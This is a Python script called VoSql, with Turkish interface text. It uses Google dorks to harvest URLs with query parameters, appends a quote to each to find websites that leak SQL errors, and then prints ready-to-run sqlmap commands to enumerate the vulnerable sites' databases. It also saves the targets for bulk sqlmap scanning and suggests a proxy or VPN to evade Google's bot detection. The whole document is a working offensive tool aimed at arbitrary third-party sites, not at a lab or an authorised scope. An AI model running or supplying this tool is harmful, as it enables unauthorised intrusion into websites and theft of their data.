import asyncio
import aiohttp
from googlesearch import search
from colorama import Fore, Back, Style, init
import datetime
import os
import random
import string
init()

def dt():
	simdi = datetime.datetime.now()
	tarih = simdi.date()
	saat = simdi.hour
	dakika = simdi.minute
	saniye = simdi.second
	if saat < 10:
		saat = f"0{saat}"
	elif dakika < 10:
		dakika = f"0{dakika}"
	elif saniye < 10:
		saniye = f"0{saniye}"

	tz = f"[{c.cyan}{saat}{c.r}:{c.cyan}{dakika}{c.r}:{c.cyan}{saniye}{c.r}]"
	nb = f"{tarih}"
	return tz


def printf(*args):
	print(f" {c.r}", *args)


class c:
	bright_black = Fore.LIGHTBLACK_EX
	bright_red = Fore.LIGHTRED_EX
	bright_green = Fore.LIGHTGREEN_EX
	bright_yellow = Fore.LIGHTYELLOW_EX
	bright_blue = Fore.LIGHTBLUE_EX
	bright_magenta = Fore.LIGHTMAGENTA_EX
	bright_cyan = Fore.LIGHTCYAN_EX
	bright_white = Fore.LIGHTWHITE_EX
	black = Fore.BLACK
	red = Fore.RED
	green = Fore.GREEN
	yellow = Fore.YELLOW
	blue = Fore.BLUE
	magenta = Fore.MAGENTA
	cyan = Fore.CYAN
	white = Fore.WHITE
	bold = Style.BRIGHT
	r = Style.RESET_ALL


class b:
	bright_black = Back.LIGHTBLACK_EX
	bright_red = Back.LIGHTRED_EX
	bright_green = Back.LIGHTGREEN_EX
	bright_yellow = Back.LIGHTYELLOW_EX
	bright_blue = Back.LIGHTBLUE_EX
	bright_magenta = Back.LIGHTMAGENTA_EX
	bright_cyan = Back.LIGHTCYAN_EX
	bright_white = Back.LIGHTWHITE_EX
	black = Back.BLACK
	red = Back.RED
	green = Back.GREEN
	yellow = Back.YELLOW
	blue = Back.BLUE
	magenta = Back.MAGENTA
	cyan = Back.CYAN
	white = Back.WHITE
	bold = Style.BRIGHT
	r = Style.RESET_ALL


def generate_random_string():
	characters = string.digits + string.ascii_letters
	random_string = ''.join(random.choices(characters, k=5))
	return random_string


def error(*args):
	dtl = dt()
	printf(dtl, f"[{c.bright_red}HATA{c.r}]", *args)


def info(*args):
	dtl = dt()
	printf(dtl, f"[{c.green}BILGI{c.r}]", *args)


def linfo(*args):
	dtl = dt()
	printf(dtl, f"[{c.bright_green}BILGI{c.r}]", *args)


def alert(*args):
	dtl = dt()
	printf(dtl, f"[{c.yellow}UYARI{c.r}]", *args)


def system(*args):
	dtl = dt()
	printf(dtl, f"[{c.bright_blue}SISTEM{c.r}]", *args)


def uc(*args):
	dtl = dt()
	printf(f"{c.yellow}->{c.r}", *args)


def stop():
	dtl = dt()
	printf(dtl, f"[{c.bright_red}x{c.r}]", "İşlem kullanıcı tarafından iptal edildi.")


star = f"[{c.bright_blue}*{c.r}]"
stare = f"[{c.bright_red}*{c.r}]"
found = []

information = f"""
--------------------------------------------
  {c.bright_green}VoSql{c.r} V1.0.1 <-> {c.bright_blue}Developer:{c.r} The Vodka
--------------------------------------------
"""

async def check_site(session, url):
	try:
		async with session.get(url, timeout=10) as response:
			if response.status == 200:
				html = await response.text(encoding="utf-8", errors="ignore")
				if "SQL syntax" in html:
					printf(f"{star} {url}")
					found.append(url)
	except:
		pass


async def main():
	sites = []
	all_sites = []

	# Google Search
	query = dork
	try:
		for result in search(query, num=1000, stop=1000):
			all_sites.append(result)
			if "?" in result:
				sites.append(result)
		linfo(f"({len(sites)}) URL Filtrelendi...")
	except:
		error(
			"Google Robot Tarafik Algıladı. Bu durum Google API'sinden kaynaklı yaygın bir durumdur. 1 Saat bekleyin yada (Proxy/vpn) açıp tekrar tarama yapın!"
		)
		exit()

	async with aiohttp.ClientSession() as session:
		tasks = []
		linfo("Tarama Başlatıldı...")
		printf("---------------------------------------------------------------")
		for url in sites:
			url_with_quote = url + "'"
			tasks.append(check_site(session, url_with_quote))
		await asyncio.gather(*tasks)
		printf("---------------------------------------------------------------")
		linfo("Tarama sonlandırıldı.")
		if len(found) < 1:
			alert(f"Sonuç Bulunamadı! Başka bir Dork deneyebilirsiniz...")
		else:
			linfo(f"({len(found)}) Sonuç bulundu... Hayırlı SQL'ler :)")
			dec = input(f"  [{c.bright_green}?{c.r}] Hazır SQLMAP kodları ister misin? (y/n): ")

			if dec.strip().lower() == "y":
				info("Komutlar Üretiliyor...")
				printf("---------------------------------------------------------------")
				for command_url in found:
					printf(f'{star} sqlmap -u "{command_url[:-1]}" --batch --random-agent --dbs')
				printf("---------------------------------------------------------------")
			elif len(dec) < 1:
				pass
			else:
				pass

			dec2 = input(f"  [{c.bright_green}?{c.r}] Verileri Kayıt Etmemi İster Misin? (y/n): ")
			if dec2.strip().lower() == "y":
				dec3 = input(f"  [{c.bright_green}?{c.r}] Kayıt edilecek dosya ismi giriniz (.txt): ")
				fname = ""
				if ".txt" in dec3:
					fname = dec3
				elif len(dec3) < 1:
					random_mix = generate_random_string()
					fname = f"{random_mix}.txt"
				else:
					fname = f"{dec3}.txt"

				try:
					with open(fname, "w") as dosya:
						for found_url in found:
							dosya.write(found_url[:-1] + "\n")
					linfo(f"{fname} Dosyasına Verileri Aktardım. Kendine iyi bak :)")
					alert(f"Ek Bilgi: - sqlmap -m {fname} - Komutu ile URL adreslerinizi hızlı tarayabilirsiniz... ")
				except Exception as e:
					error(f"{fname} dosyasına verileri yazarken bir problem oluştu! Hata: {e}")


if __name__ == "__main__":
	print(information)
	dork = input(f"  [{c.bright_green}?{c.r}] Dork Giriniz: ")
	if len(dork.strip()) < 1:
		error("Değer Girmediniz!")
		exit()
	else:
		asyncio.run(main())
